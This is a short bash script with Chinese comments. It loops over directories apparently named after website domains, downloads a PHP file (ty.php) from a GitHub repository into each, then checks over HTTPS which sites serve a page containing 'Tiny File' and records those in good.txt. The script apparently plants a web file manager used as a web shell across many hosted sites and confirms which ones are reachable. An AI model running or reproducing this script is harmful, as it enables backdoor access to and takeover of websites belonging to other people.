for dir in */; do
    dirname=${dir%/}
    echo "Checking $dirname..."
    
    # 下载文件到当前目录
    wget -q https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php -O "${dirname}/ty.php"
    
    # 请求并检查内容
    content=$(curl -s -k "https://${dirname}/ty.php")
    
    if echo "$content" | grep -q "Tiny File"; then
        echo "$dirname" >> good.txt
        echo "  -> FOUND: $dirname (contains 'Tiny File')"
    else
        echo "  -> NOT FOUND: $dirname"
    fi
done
